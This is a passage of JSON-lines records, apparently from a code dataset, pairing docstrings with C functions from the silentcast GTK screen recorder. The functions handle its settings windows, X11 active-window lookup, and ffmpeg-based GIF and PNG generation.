*p_fps);\n  strcat (convert_com, delay);\n  strcat (convert_com, \" -layers optimize ew-[0-9][0-9][0-9].png anim.gif'\");\n  //spawn it\n  GPid convert_com_pid = 0;\n  SC_spawn (widget, convert_com, &convert_com_pid, \"Making anim.gif from pngs.\", \"show_edit_pngs\"); \n  return TRUE;\n}", "path": "silentcast/src/SC_temptoanim.c", "commit_date": "2017-08-30 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* SC_get_active_windows_and_geometry (...) calls get_active_x11window (...) to get the active X11 window\n * and it's children, then calls SC_get_geometry_for (...) to get geometry (hopefully Gdk) that matches\n */\n", "func_signal": "gboolean\nSC_get_active_windows_and_geometry (Window *aw, Window* *aw_children, ssize_t *n, \n    GdkRectangle *win_rect, GdkRectangle *extents, GdkWindow* *dwindow)", "code": "{\n  \n  switch (SC_get_active_X11window(aw, aw_children, n)) { //mem leak get aw, aw_children, and n (number of children)\ncase 0: SC_get_geometry_for (*aw, *aw_children, *n, win_rect, extents, dwindow); return TRUE; //mem leak\ncase SC_X11_E1: fprintf (stderr, SC_X11_ERROR1); break;\ncase SC_X11_E2: fprintf (stderr, SC_X11_ERROR2); break;\ncase SC_X11_E3: fprintf (stderr, SC_X11_ERROR3); break;\ncase SC_X11_E4: fprintf (stderr, SC_X11_ERROR4); break;\n  }     \n  return FALSE; //failed to get active window due to X11 error\n}", "path": "silentcast/lib/SC_X11_get_active_window.c", "commit_date": "2017-04-13 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "//kept getting segfault in trying to use qsort, so found this bubblesort here: \n//http://stackoverflow.com/questions/6631355/sorting-alphabetically-in-c-using-strcmp\n", "func_signal": "static void sort_pngs (char **png, int pngc)", "code": "{\n  int limit = pngc - 1;\n  gboolean did_swap = TRUE;\n  char *temp;\n\n  while (did_swap) {\n    did_swap = FALSE;\n    for (int i = 0; i < limit; i++) {\n      if (strcmp (png[i], png[i+1]) > 0) {\n        temp = png[i];\n        png[i] = png[i+1];\n        png[i+1] = temp;\n        did_swap = TRUE;\n      }\n    }\n    limit--;\n  }\n}", "path": "silentcast/src/SC_temptoanim.c", "commit_date": "2017-08-30 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "//write previous rectangle geometry to $home/.config/silentcast_presets\n", "func_signal": "static void write_previous (GtkWidget *widget, GdkRectangle previous)", "code": "{\n  double presets[PRESET_N], prepre[2], pre[PRESET_N + 2];\n  char filename[PATH_MAX], contents[(PRESET_N + 2) * 12], char_preset[11];\n\n  get_presets (widget, presets, prepre);\n  for (int i=0; i<PRESET_N; i++) pre[i] = presets[i]; \n  pre[PRESET_N] = (double) previous.x + (double) previous.y / 100000; \n  pre[PRESET_N + 1] = (double) previous.width + (double) previous.height / 100000;\n\n  snprintf (char_preset, 11, \"%f\", pre[0]);\n  strcpy (contents, char_preset);\n  for (int i=1; i<PRESET_N + 2; i++) {\n    strcat (contents, \"\\n\");\n    snprintf (char_preset, 11, \"%f\", pre[i]);\n    strcat (contents, char_preset);\n  }\n  \n  strcpy (filename, g_get_home_dir());\n  strcat (filename, \"/.config/silentcast_presets\");\n  char *glib_encoded_filename = SC_get_glib_filename (widget, filename);\n  if (glib_encoded_filename) {\n    g_file_set_contents (glib_encoded_filename, contents, -1, NULL);\n    g_free (glib_encoded_filename);\n  }\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "// preprocessor changes #A to \"A\"\n", "func_signal": "static void show_perror (GtkWidget *widget, char *message)", "code": "{\n  perror (message);\n\n  char str_err[1024] = { 0 }; \n  char err_message[1200] = { 0 };\n\n  strcpy (err_message, message);\n  strcat (err_message, \": \");\n  strerror_r (errno, str_err, 1024);\n  strcat (err_message, str_err);\n  GtkWidget *dialog = \n    gtk_message_dialog_new (GTK_WINDOW(widget), \n        GTK_DIALOG_DESTROY_WITH_PARENT, \n        GTK_MESSAGE_ERROR, GTK_BUTTONS_CLOSE, \"%s\", err_message);\n  gtk_dialog_run (GTK_DIALOG (dialog));\n  gtk_widget_destroy (dialog);\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* f3_widget just displays the ffmpeg command that would be saved on pressing ENTER */\n", "func_signal": "static void show_f3_widget (GtkApplication *app, GtkWidget *widget)", "code": "{\n  GtkWidget *f3_widget = gtk_application_window_new (app);\n  gtk_window_set_transient_for (GTK_WINDOW(f3_widget), GTK_WINDOW(widget));\n  gtk_window_set_title (GTK_WINDOW(f3_widget), \"Silentcast F3\");\n\n  GdkRectangle *mon_rect = P(\"p_surface_rect\");\n  GtkWidget *working_dir_label = gtk_label_new (gtk_entry_buffer_get_text(P(\"working_dir\")));\n  GtkWidget *ffcom_entry = gtk_entry_new_with_buffer (get_ffcom(P(\"ffcom_string\"), P(\"p_area_rect\"), mon_rect->x, mon_rect->y, P(\"p_fps\")));\n  GtkWidget *box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 8);\n  gtk_container_add (GTK_CONTAINER(box), working_dir_label);\n  gtk_editable_set_editable (GTK_EDITABLE(ffcom_entry), FALSE);\n  gtk_container_add (GTK_CONTAINER(box), ffcom_entry);\n  gtk_container_add (GTK_CONTAINER(f3_widget), box);\n  gtk_widget_show_all(f3_widget);\n  gdk_window_resize (gtk_widget_get_window(ffcom_entry), 8 * gtk_entry_get_text_length (GTK_ENTRY(ffcom_entry)), 32);\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "//Starts a chain of spawned commands. Each call to SC_spawn specifies a command to spawn and a nextfunc to call next.\n//The nextfunc gets called in a watch child callback function when the spawned command ends.\n", "func_signal": "void SC_generate_outputs (GtkWidget *widget)", "code": "{\n  char silentcast_dir[PATH_MAX];\n  get_silentcast_dir (widget, silentcast_dir);\n  \n  if (temp_exists (widget, silentcast_dir)) {\n    gboolean *p_pngs = P(\"p_pngs\"), *p_gif = P(\"p_gif\"), *p_anims_from_temp = P(\"p_anims_from_temp\");\n    if (*p_pngs || *p_gif || !*p_anims_from_temp) {\n      delete_pngs (widget, silentcast_dir, 0); //before generating new pngs, delete any existing ones (0 means keep none)\n      char ff_gen_pngs[200];\n      int *p_fps = P(\"p_fps\");\n      char char_fps[5]; snprintf (char_fps, 5, \"%d\", *p_fps);\n      //construct the command to generate pngs: ffmpeg -i -temp.mkv -r fps ew-%03d.png\n      strcpy (ff_gen_pngs, \"/bin/sh -c '/usr/bin/ffmpeg -i temp.mkv -r \");\n      strcat (ff_gen_pngs, char_fps);\n      strcat (ff_gen_pngs, \" ew-%03d.png'\");\n      //spawn it\n      GPid ff_gen_pngs_pid = 0;\n\n      //spawn command to generate the pngs then call show_edit_pngs if gif is a final output otherwise move on to webm\n      char funcname[20];\n      if (*p_gif) strcpy (funcname, \"show_edit_pngs1\"); //the 1 means don't check for anim.gif before running show_edit_pngs\n      else strcpy (funcname, \"make_webm_from_temp\");\n      SC_spawn (widget, ff_gen_pngs, &ff_gen_pngs_pid, \"Generating pngs from anim.temp.\", funcname); \n    } else SC_spawn (widget, NULL, NULL, \"\", \"make_webm_from_temp\"); //don't spawn anything and move on \n  } else SC_spawn (widget, NULL, NULL, \"\", \"stop\"); //stop trying to make anim if there's no temp.mkv\n}", "path": "silentcast/src/SC_temptoanim.c", "commit_date": "2017-08-30 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* Redraw the screen from the surface. The draw signal receives a ready-to-be-used cairo_t that is already\n * clipped to only draw the exposed areas of the widget. This is never called directly, but a draw can be\n * queued with gtk_widget_queue_draw (widget) and similar functions.\n */\n", "func_signal": "static gboolean draw_cb (GtkWidget *widget, cairo_t   *cr, gpointer   data)", "code": "{\n  gboolean *p_surface_became_fullscreen = P(\"p_surface_became_fullscreen\");\n  gboolean *p_surface_ready = P(\"p_surface_ready\");\n  if (*p_surface_became_fullscreen) {\n    /* Save geometry of the surface so draw_rect will have it.\n     * Since the surface widget is fullscreen, the geometry\n     * should be the same as would be gotten from gdk_monitor_get_geometry \n     * but that function is only available in gtk3 3.22 which most\n     * linux users don't have in March 2017\n     */\n    GdkRectangle *p_surface_rect = P(\"p_surface_rect\");\n    gdk_cairo_get_clip_rectangle (cr, p_surface_rect);\n    gtk_window_get_position (GTK_WINDOW(widget), &p_surface_rect->x, &p_surface_rect->y);\n\n    //now need to subtract the surface_rect position from active_win and extents so that active_win\n    //and extents will be relative to the surface they are drawn on\n    GdkRectangle *p_actv_win = P(\"p_actv_win\"), *p_extents = P(\"p_extents\");\n    p_actv_win->x = p_actv_win->x - p_surface_rect->x;\n    p_actv_win->y = p_actv_win->y - p_surface_rect->y;\n    p_extents->x = p_extents->x - p_surface_rect->x;\n    p_extents->y = p_extents->y - p_surface_rect->y;\n\n    //if the \"area\" letter is \"e\" or \"i\", but the active window is fullscreen or larger, change the \"area\" letter to \"c\"\n    if (!strcmp (P(\"area\"), \"e\") || !strcmp (P(\"area\"), \"i\")) \n      if (p_actv_win->width >= p_surface_rect->width && p_actv_win->height >= p_surface_rect->height) strcpy (P(\"area\"), \"c\");\n\n    //set initial rectangle geometry based on the \"area\" letter read from silentcast.conf\n    //strcmp is 0 when they match, so !strcmp is TRUE when they match\n    if (!strcmp (P(\"area\"), \"e\") || !strcmp (P(\"area\"), \"i\"))\n      set_rect_around_active_window (widget, P(\"p_area_rect\"), P(\"p_actv_win\"), P(\"p_extents\"), P(\"p_include_extents\")); \n    else if (!strcmp (P(\"area\"), \"c\"))\n      set_rect_around_center_fourth (P(\"p_area_rect\"), P(\"p_surface_rect\"));\n    else\n      set_rect_to_previous (P(\"p_area_rect\"), P(\"previous\"));\n    //prevent infinite loop since draw_rect will queue more draws\n    *p_surface_became_fullscreen = FALSE; //only do this once after becoming fullscreen, not on every draw\n    *p_surface_ready = TRUE; //signals that future fullscreen event should stop ffmpeg and move to next step\n                             //this was added for tiling window managers\n    draw_rect (widget, P(\"p_area_rect\"), P(\"surface\"));\n  }\n\n  /* set compositing operation to replace target with source */\n  cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);\n  cairo_set_source_surface (cr, P(\"surface\"), 0, 0);\n  cairo_paint (cr);\n\n  return FALSE;\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* tran_setup copied from \n * http://stackoverflow.com/questions/36994927/gtk3-window-transparent?answertab=active#tab-top\n */\n", "func_signal": "static void tran_setup(GtkWidget *widget)", "code": "{\n  GdkScreen *screen;\n  GdkVisual *alpha_visual;\n\n  gtk_widget_set_app_paintable(widget, TRUE);\n  screen = gdk_screen_get_default();\n  alpha_visual = gdk_screen_get_rgba_visual(screen);\n\n  if (alpha_visual != NULL && gdk_screen_is_composited(screen)) {\n    gtk_widget_set_visual(widget, alpha_visual);\n  } \n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "// Need to keep track of both key press and key release to distinguish unwanted terminal Return from others.\n// The terminal Return that started the app won't have a key press event.\n", "func_signal": "static gboolean key_press_event_cb (GtkWidget *widget,\n                            GdkEventKey *event,\n                                gpointer data)", "code": "{\n  gboolean *p_key_pressed = P(\"p_key_pressed\");\n  *p_key_pressed = TRUE;\n  return FALSE; //continue processing event\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "// called when surface widget is closed\n", "func_signal": "gboolean on_surface_widget_destroy (GtkWidget *widget, \n                                      gpointer data)", "code": "{\n  GtkWidget *active_window = P(\"active_window\");\n  cairo_surface_t *surface = P(\"surface\");\n\n  if (surface) cairo_surface_destroy (surface);\n  if (active_window ) g_clear_object (&active_window);\n  GdkRectangle *rect = P(\"p_area_rect\");\n  write_previous (widget, *rect);\n  g_application_quit (G_APPLICATION(data));\n\n  return FALSE; //keep processing the destroy signal\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* f2_widget\n * checkbox for resize active window with rectangle\n * spinbuttons for p_area_rect x, y, width, height\n */\n", "func_signal": "static void show_f2_widget (GtkApplication *app, GtkWidget *widget)", "code": "{\n  GtkWidget *f2_widget = gtk_application_window_new (app);\n  gtk_window_set_transient_for (GTK_WINDOW(f2_widget), GTK_WINDOW(widget));\n  gtk_window_set_title (GTK_WINDOW(f2_widget), \"Silentcast F2\");\n  GtkWidget *f2 = gtk_grid_new ();\n  gtk_grid_set_row_spacing (GTK_GRID(f2), ROW_SPACING);\n  gtk_container_add (GTK_CONTAINER(f2_widget), f2);\n  GdkRectangle *p_area_rect = P(\"p_area_rect\");\n  GtkWidget *x_spin_button = NULL, *y_spin_button = NULL, *w_spin_button = NULL, \n                   *h_spin_button = NULL, *should_resize_active_checkbox = NULL;\n\n  GtkWidget *set_area_label = gtk_label_new (NULL); gtk_widget_set_halign (set_area_label, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(set_area_label), BGN_SCTN\"Set rectangle position and size\"END_SCTN);\n\n  //spinbuttons for setting the area\n  GtkAdjustment *adjustmentx = gtk_adjustment_new (p_area_rect->x, 0.0, 9999.0, 1.0, 5.0, 0.0);\n  x_spin_button = gtk_spin_button_new (adjustmentx, 1.0, 0);\n  g_signal_connect (x_spin_button, \"value-changed\", \n     G_CALLBACK(on_value_changed_x), widget);\n  GtkAdjustment *adjustmenty = gtk_adjustment_new (p_area_rect->y, 0.0, 9999.0, 1.0, 5.0, 0.0);\n  y_spin_button = gtk_spin_button_new (adjustmenty, 1.0, 0);\n  g_signal_connect (y_spin_button, \"value-changed\", \n     G_CALLBACK(on_value_changed_y), widget);\n  GtkAdjustment *adjustmentw = gtk_adjustment_new (p_area_rect->width, 0.0, 9999.0, 1.0, 5.0, 0.0);\n  w_spin_button = gtk_spin_button_new (adjustmentw, 1.0, 0);\n  g_signal_connect (w_spin_button, \"value-changed\", \n     G_CALLBACK(on_value_changed_w), widget);\n  GtkAdjustment *adjustmenth = gtk_adjustment_new (p_area_rect->height, 0.0, 9999.0, 1.0, 5.0, 0.0);\n  h_spin_button = gtk_spin_button_new (adjustmenth, 1.0, 0);\n  g_signal_connect (h_spin_button, \"value-changed\", \n     G_CALLBACK(on_value_changed_h), widget);\n\n  //checkbox for whether or not to resize the active window with the rectangle\n  GtkWidget *should_resize_active_checkbox_lbl = gtk_label_new (\"Resize active window with rectangle \");\n  gtk_widget_set_halign (should_resize_active_checkbox_lbl, GTK_ALIGN_END);\n  should_resize_active_checkbox = gtk_check_button_new (); gtk_widget_set_halign (should_resize_active_checkbox, GTK_ALIGN_START);\n  gboolean *p_should_resize_active = P(\"p_should_resize_active\");\n  g_signal_connect (should_resize_active_checkbox, \"toggled\", \n     G_CALLBACK(on_toggled_should_resize_active_checkbox), p_should_resize_active);\n\n  GtkWidget *size_label = gtk_label_new (\"size\"); gtk_widget_set_halign (size_label, GTK_ALIGN_START);\n  GtkWidget *posi_label = gtk_label_new (\"position\"); gtk_widget_set_halign (posi_label, GTK_ALIGN_START);\n  GtkWidget *x_label = gtk_label_new (\"x: \"); gtk_widget_set_halign (x_label, GTK_ALIGN_END);\n  GtkWidget *y_label = gtk_label_new (\"y: \"); gtk_widget_set_halign (y_label, GTK_ALIGN_END);\n  GtkWidget *w_label = gtk_label_new (\"     width: \"); gtk_widget_set_halign (w_label, GTK_ALIGN_END);\n  GtkWidget *h_label = gtk_label_new (\"    height: \"); gtk_widget_set_halign (h_label, GTK_ALIGN_END);\n\n  //update should_resize_active_checkbox\n  gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON(should_resize_active_checkbox),*p_should_resize_active);\n  \n#define F2_ATCH(A,C,R,W) gtk_grid_attach (GTK_GRID(f2), A, C, R, W, 1) \n  F2_ATCH(gtk_label_new (\"      \"), 0, 0, 1);                                                      F2_ATCH(gtk_label_new (\"      \"), 5, 0, 1);\n                            F2_ATCH(should_resize_active_checkbox_lbl, 2, 1, 3);              F2_ATCH(should_resize_active_checkbox, 5, 1, 1);\n              F2_ATCH(set_area_label, 1, 2, 5);\n                                                   F2_ATCH(posi_label, 2, 3, 1);                               F2_ATCH(size_label, 4, 3, 1);\n                     F2_ATCH(x_label, 1, 4, 1); F2_ATCH(x_spin_button, 2, 4, 1); F2_ATCH(w_label, 3, 4, 1); F2_ATCH(w_spin_button, 4, 4, 1); \n                     F2_ATCH(y_label, 1, 5, 1); F2_ATCH(y_spin_button, 2, 5, 1); F2_ATCH(h_label, 3, 5, 1); F2_ATCH(h_spin_button, 4, 5, 1);\n  F2_ATCH(gtk_label_new (\"      \"), 0, 6, 1);\n  gtk_widget_show_all(f2_widget);\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* SC_get_active_gdkwindow (...) tries to match a GdkWindow to one of the passed X11\n * windows (supposed to be the active X11 window and it's n children), and returns\n * TRUE if such a match is found, FALSE if not\n */\n", "func_signal": "gboolean\nSC_get_active_gdkwindow (Window aw, Window *aw_children, ssize_t n, GdkWindow* *gdkwindow)", "code": "{\n  ssize_t i = 0;\n  GdkWindow *dwindow = NULL;\n  GdkScreen *screen = NULL;\n  GList *gl_item = NULL, *gl = NULL;\n  gboolean active_window_found = FALSE;\n  \n\n  screen = gdk_screen_get_default ();\n  if (screen != NULL) { \n    /* Go through all windows known to Gtk and check XID against active X11 window, aw. */\n    gl = gdk_screen_get_window_stack (screen);\n    for (gl_item = g_list_first (gl); !active_window_found && gl_item != NULL; gl_item = gl_item->next) { \n\n      dwindow = gl_item->data;\n      \n      if (gdk_x11_window_get_xid (dwindow) == aw) active_window_found = TRUE;\n      else for (i = 0; i < n; i++)  //aw didn't match this dwindow, so check all of aw_children\n        if (gdk_x11_window_get_xid (dwindow) == aw_children[i]) active_window_found = TRUE;\n      \n      if (!active_window_found) g_object_unref (dwindow);\n      else *gdkwindow = dwindow;\n    } \n    g_list_free (gl);\n  }\n  return active_window_found;\n}", "path": "silentcast/lib/SC_X11_get_active_window.c", "commit_date": "2017-04-13 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "// preprocessor changes #A to \"A\"\n", "func_signal": "void SC_show_f1_widget (GtkApplication *app, GtkWidget *widget)", "code": "{\n  GtkWidget *f1_widget = gtk_application_window_new (app);\n  gtk_window_set_transient_for (GTK_WINDOW(f1_widget), GTK_WINDOW(widget));\n  GtkWidget *f1 = gtk_notebook_new ();\n  /* initialize About Mouse Controls widgets */\n  GtkWidget *about_controls = gtk_grid_new ();\n  gtk_grid_set_row_spacing (GTK_GRID(about_controls), ROW_SPACING);\n  GtkWidget *about_label = gtk_label_new (\"About Mouse Controls\");\n  GtkWidget *about_button = gtk_button_new_with_label (\"About Silentcast\");\n  g_signal_connect (about_button, \"clicked\",\n      G_CALLBACK(show_about_cb), NULL);\n\n  /* initialize Configuration widgets */\n  GtkWidget *config = gtk_grid_new ();\n  gtk_grid_set_column_spacing (GTK_GRID(config), COL_SPACING);\n  gtk_grid_set_row_spacing (GTK_GRID(config), ROW_SPACING);\n  GtkWidget *config_label = gtk_label_new (\"Configuration\");\n  GtkWidget *save_config = gtk_button_new_with_label (\"Save\");\n  g_signal_connect (save_config, \"clicked\", \n     G_CALLBACK(save), widget);\n  //working directory\n  GtkWidget *view_w_dir_entry = gtk_entry_new_with_buffer (P(\"working_dir\"));\n  gtk_editable_set_editable (GTK_EDITABLE(view_w_dir_entry), FALSE);\n  GtkWidget *change_w_dir = gtk_button_new_from_icon_name (\"folder-open\", GTK_ICON_SIZE_BUTTON);\n  g_signal_connect (change_w_dir, \"clicked\", \n     G_CALLBACK(change_w_dir_cb), widget);\n  //Configuration button widgets\n  static GtkWidget *fps_spin_button = NULL, *gif_checkbox = NULL, *png_checkbox = NULL, \n                   *webm_checkbox = NULL, *mp4_checkbox = NULL, *from_mkv_combobutt = NULL;\n  //fps_spin_button\n  int *p_fps = P(\"p_fps\");\n  GtkAdjustment *adjustment = gtk_adjustment_new (*p_fps, 0.0, 120.0, 1.0, 5.0, 0.0);\n  fps_spin_button = gtk_spin_button_new (adjustment, 1.0, 0);\n  //final outputs checkboxes\n  gboolean *p_gif = P(\"p_gif\"), *p_pngs = P(\"p_pngs\"), *p_webm = P(\"p_webm\"), *p_mp4 = P(\"p_mp4\");\n  gif_checkbox = gtk_check_button_new_with_label (\"anim.gif\");\n  png_checkbox = gtk_check_button_new_with_label (\"ew-???.png images\");\n  webm_checkbox = gtk_check_button_new_with_label (\"anim.webm\");\n  mp4_checkbox = gtk_check_button_new_with_label (\"anim.mp4\");\n  gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON(gif_checkbox), *p_gif);\n  gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON(png_checkbox), *p_pngs);\n  gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON(webm_checkbox), *p_webm);\n  gtk_toggle_button_set_active (GTK_TOGGLE_BUTTON(mp4_checkbox), *p_mp4);\n  //from_mkv_combobutt\n  gboolean *p_anims_from_temp = P(\"p_anims_from_temp\");\n  from_mkv_combobutt = gtk_combo_box_text_new ();\n  gtk_combo_box_text_append (GTK_COMBO_BOX_TEXT(from_mkv_combobutt), NULL, \"temp.mkv\"); \n  gtk_combo_box_text_append (GTK_COMBO_BOX_TEXT(from_mkv_combobutt), NULL, \"ew-???.png\"); \n  gtk_combo_box_set_active (GTK_COMBO_BOX(from_mkv_combobutt), !*p_anims_from_temp); //want index 0 when want temp... i.e. !anims.., 1 for ew...\n  //PF1_SET the Configuration Widgets to be recovered in other functions using PF1\n  PF1_SET(fps_spin_button); PF1_SET(gif_checkbox); PF1_SET(png_checkbox); PF1_SET(webm_checkbox); PF1_SET(mp4_checkbox); PF1_SET(from_mkv_combobutt);\n\n  /* initialize Rectangle Preferences widgets */\n  GtkWidget *prefs = gtk_grid_new ();\n  gtk_grid_set_column_spacing (GTK_GRID(prefs), COL_SPACING);\n  gtk_grid_set_row_spacing (GTK_GRID(prefs), ROW_SPACING);\n  GtkWidget *prefs_label = gtk_label_new (\"Rectangle Preferences\");\n  //radiobuttons\n  static GtkWidget *active_win_radiobutt = NULL, *center_radiobutt = NULL, *previous_radiobutt = NULL;\n  active_win_radiobutt = gtk_radio_button_new_with_label (NULL, \"Active window\");\n  g_signal_connect (active_win_radiobutt, \"toggled\", \n     G_CALLBACK(on_active_win_radiobutt_changed), widget);\n  center_radiobutt = gtk_radio_button_new_with_label (\n      gtk_radio_button_get_group (GTK_RADIO_BUTTON(active_win_radiobutt)),\n      \"Center fourth of screen\");\n  g_signal_connect (center_radiobutt, \"toggled\", \n     G_CALLBACK(on_center_radiobutt_changed), widget);\n  previous_radiobutt = gtk_radio_button_new_with_label (\n      gtk_radio_button_get_group (GTK_RADIO_BUTTON(center_radiobutt)),\n      \"Previously recorded area\");\n  g_signal_connect (previous_radiobutt, \"toggled\", \n     G_CALLBACK(on_previous_radiobutt_changed), widget);\n  PF1_SET(active_win_radiobutt); PF1_SET(center_radiobutt); PF1_SET(previous_radiobutt);\n  //arrays of spinbuttons displaying presests\n  static GtkWidget *w_spinbutt[PRESET_N], *h_spinbutt[PRESET_N];\n  double *presets = P(\"presets\");\n  GtkAdjustment *adjstmnt_w[PRESET_N];\n  static int j[PRESET_N];\n  for (int i = 0; i < PRESET_N; i++) j[i] = i; //array of indexes to pass i as gpointer data\n  for (int i = 0; i < PRESET_N; i++) {\n    adjstmnt_w[i] = gtk_adjustment_new (SC_get_w (presets[i]), 0.0, 9999.0, 1.0, 5.0, 0.0);\n    w_spinbutt[i] = gtk_spin_button_new (adjstmnt_w[i], 1.0, 0);\n    g_signal_connect (w_spinbutt[i], \"value-changed\", \n       G_CALLBACK(on_w_spinbutt_changed), &j[i]);\n  }\n  GtkAdjustment *adjstmnt_h[PRESET_N];\n  for (int i = 0; i < PRESET_N; i++) {\n    adjstmnt_h[i] = gtk_adjustment_new (SC_get_h (presets[i]), 0.0, 9999.0, 1.0, 5.0, 0.0);\n    h_spinbutt[i] = gtk_spin_button_new (adjstmnt_h[i], 1.0, 0);\n    g_signal_connect (h_spinbutt[i], \"value-changed\", \n       G_CALLBACK(on_h_spinbutt_changed), &j[i]);\n  }\n  PF1_SET(w_spinbutt); PF1_SET(h_spinbutt);\n  //extents_checkbox\n  GtkWidget *extents_checkbox = NULL;\n  extents_checkbox = gtk_check_button_new_with_label (\"with title and borders\");\n  g_signal_connect (extents_checkbox, \"toggled\", \n     G_CALLBACK(on_extents_checkbox_changed), widget);\n  PF1_SET(extents_checkbox);\n\n  GtkWidget *save_prefs = gtk_button_new_with_label (\"Save\");\n  g_signal_connect (save_prefs, \"clicked\", \n     G_CALLBACK(save), widget);\n\n  /* title f1_widget and put the notebook, f1, into it */\n  gtk_window_set_title (GTK_WINDOW(f1_widget), \"Silentcast F1\");\n  gtk_container_add (GTK_CONTAINER(f1_widget), f1);\n\n  /* insert the 3 tabs */\n  gtk_notebook_insert_page (GTK_NOTEBOOK(f1), about_controls, about_label, -1);\n  gtk_notebook_insert_page (GTK_NOTEBOOK(f1), config, config_label, -1);\n  gtk_notebook_insert_page (GTK_NOTEBOOK(f1), prefs, prefs_label, -1);\n\n  /* About tab layout */\n  GtkWidget *lclabel = gtk_label_new (NULL); gtk_widget_set_halign (lclabel, GTK_ALIGN_END);\n  gtk_widget_set_valign (lclabel, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(lclabel), BGN_SCTN\"left-click/drag: \"END_SCTN);\n  GtkWidget *lcexpln = gtk_label_new (\"Move rectangle by the top-left corner\");\n  gtk_widget_set_halign (lcexpln, GTK_ALIGN_START);\n\n  GtkWidget *rclabel = gtk_label_new (NULL); gtk_widget_set_halign (rclabel, GTK_ALIGN_END);\n  gtk_widget_set_valign (rclabel, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(rclabel), BGN_SCTN\"right-click/drag: \"END_SCTN);\n  GtkWidget *rcexpln = gtk_label_new (\"Resize the rectangle by the bottom-right corner\");\n  gtk_widget_set_halign (rcexpln, GTK_ALIGN_START);\n\n  GtkWidget *mclabel = gtk_label_new (NULL); gtk_widget_set_halign (mclabel, GTK_ALIGN_END);\n  gtk_widget_set_valign (mclabel, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(mclabel), BGN_SCTN\"middle-click: \"END_SCTN);\n  GtkWidget *mcexpln = gtk_label_new (\"Resize rectangle to include/not include title and \\nborders of the original active window\");\n  gtk_widget_set_halign (mcexpln, GTK_ALIGN_START);\n\n  GtkWidget *mdlabel = gtk_label_new (NULL); gtk_widget_set_halign (mdlabel, GTK_ALIGN_END);\n  gtk_widget_set_valign (mdlabel, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(mdlabel), BGN_SCTN\"middle-drag: \"END_SCTN);\n  GtkWidget *mdexpln = gtk_label_new (\"Resize rectangle to the largest fitting preset \\nbetween top left corner and mouse pointer\");\n  gtk_widget_set_halign (mdexpln, GTK_ALIGN_START);\n\n  GtkWidget *swlabel = gtk_label_new (NULL); gtk_widget_set_halign (swlabel, GTK_ALIGN_END);\n  gtk_widget_set_valign (swlabel, GTK_ALIGN_START);\n  gtk_label_set_markup (GTK_LABEL(swlabel), BGN_SCTN\"scroll wheel: \"END_SCTN);\n  GtkWidget *swexpln = gtk_label_new (\"Resize rectangle to the next preset size\");\n  gtk_widget_set_halign (swexpln, GTK_ALIGN_START);\n\n  GtkWidget * f2expln = gtk_label_new (\"        If the F2 \\\"Resize active window to match\\\" checkbox is active, the active window will be resized\\n\\\n        along with the rectangle\");\n\n#define ABOUT_ATTACH(A,C,R,W) gtk_grid_attach (GTK_GRID(about_controls), A, C, R, W, 1) \n                                                                               ABOUT_ATTACH(about_button, 6, 0, 1);\n                ABOUT_ATTACH(lclabel, 1, 1, 1); ABOUT_ATTACH(lcexpln, 2, 1, 4);\n                ABOUT_ATTACH(rclabel, 1, 2, 1); ABOUT_ATTACH(rcexpln, 2, 2, 4);\n                ABOUT_ATTACH(mclabel, 1, 3, 1); ABOUT_ATTACH(mcexpln, 2, 3, 4);\n                ABOUT_ATTACH(mdlabel, 1, 4, 1); ABOUT_ATTACH(mdexpln, 2, 4, 4);\n                ABOUT_ATTACH(swlabel, 1, 5, 1); ABOUT_ATTACH(swexpln, 2, 5, 4);\n                ABOUT_ATTACH(f2expln, 1, 6, 5);\n\n  /* Configuration tab layout */\n  GtkWidget *fps_label = gtk_label_new (\"Frames per second\"); gtk_widget_set_halign (fps_label, GTK_ALIGN_END);\n  GtkWidget *from_label = gtk_label_new (\"Videos made from:\"); gtk_widget_set_halign (from_label, GTK_ALIGN_END);\n  GtkWidget *out_label = gtk_label_new (\"Final Outputs\"); 